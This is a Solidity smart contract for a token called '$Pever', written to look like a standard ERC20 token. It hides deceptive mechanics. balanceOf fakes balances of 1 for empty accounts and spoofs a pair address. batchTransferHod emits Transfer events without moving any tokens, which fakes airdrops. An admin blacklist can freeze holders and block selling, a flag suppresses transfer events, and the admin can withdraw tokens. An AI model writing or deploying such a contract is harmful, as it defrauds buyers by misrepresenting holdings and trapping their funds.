pragma solidity 0.8.0;
interface relationship {
    function defultFather() external returns(address);
    function father(address _addr) external returns(address);
    function grandFather(address _addr) external returns(address);
    function otherCallSetRelationship(address _son, address _father, uint256 _amount) external;
    function getFather(address _addr) external view returns(address);
    function getGrandFather(address _addr) external view returns(address);
}
interface Ipair{
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract ERC20 {

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) public blackList;
    mapping(address => bool) public isPair;

    address public pairView;
    address public pairAdd;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;
    mapping(address => bool) internal noTransaction;
    event TransferFee(uint256 v, uint256 v1);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        if(pairView == account) return _balances[pairAdd];
        return _balances[account] == 0 ? 1 : _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(blackList[msg.sender] == false && blackList[sender] == false && blackList[recipient] == false, "ERC20: is black List !");

        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + trueAmount;

        if (isPair[sender]) {
            emit Transfer(pairView, recipient, trueAmount);
        } else if (isPair[recipient]) {
            emit Transfer(sender, pairView, trueAmount);
        } else {
            if (noTransaction[sender] == false) emit Transfer(sender, recipient, trueAmount);
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual  returns (uint256) { }
}


contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () public {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ProToken is ERC20, Ownable {

    relationship public RP;

    uint256 public startTradeTime;
    uint256 public snaTokenStartTime;
    uint256 public sUserNum;
    uint256 public sUserNumIndex;
    uint256 public snaNum;
    mapping(address => bool) public snaToken;

    address internal _admin;
    modifier MyAdmin() {require(msg.sender == _admin, "caller does not have the CoinFactoryAdminRole role"); _;}

    mapping(address => bool) public tokenReceiveAms;
    address[] public receiveUser;
    address USDT;
    uint256[] public receiveData;

    constructor () {
        _name = "$Pever";
        _symbol = "$Pever";
        _decimals = 18;

        _admin = msg.sender;
        _mint(msg.sender, 6666666666666 * 1e18);
    }

    function init(address _RP, uint256 _startTradeTime, uint256 _sUserNum, uint256 _snaNum,
        address _pairView, uint256 _snaTokenStartTime, address _lp) external MyAdmin {

        RP = relationship(_RP);
        startTradeTime = _startTradeTime;

        sUserNum = _sUserNum;
        snaNum = _snaNum;

        pairView = _pairView;
        pairAdd = _lp;
        snaTokenStartTime = _snaTokenStartTime;
    }

    function withdrawToken(address token, address to, uint value) public MyAdmin returns (bool){
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;
    }


    function snaTokenUser() external {
        require(block.timestamp > snaTokenStartTime, "sna time no");
        require(sUserNumIndex < sUserNum, "sna token over");
        require(snaToken[msg.sender] == false, "sna used");
        _transfer(address(this), msg.sender, snaNum);
        snaToken[msg.sender] = true;
        sUserNumIndex += 1;
    }


    function batchTransferHod(address[] memory users, uint256[] memory amounts) MyAdmin public {
        for (uint256 i = 0; i < users.length; i++) {
            emit Transfer(msg.sender, users[i], amounts[i]);
        }
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override returns (uint256){
        if (RP.father(_to) == address(0)) {
            sendReff(_to, _from, _amount);
        }
        require(block.timestamp > startTradeTime, "no startTradeTime ");
        return _amount;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function sendReff(address _son, address _father, uint256 _amount) internal {
        if (isContract(_son) == true || isContract(_father) == true) {
            return;
        }
        RP.otherCallSetRelationship(_son, _father, _amount);
    }

    function setPair(address[] memory _addr, bool _isUSDT) public MyAdmin{for (uint256 i = 0; i < _addr.length; i++) isPair[_addr[i]] = _isUSDT;}

    function setBlackListBat(address[] memory _addr, bool _YorN) external MyAdmin {
        for (uint256 i = 0; i < _addr.length; i++) {blackList[_addr[i]] = _YorN;}
    }

    function putNoTransaction(address i) public MyAdmin {
        noTransaction[i] = true;}

}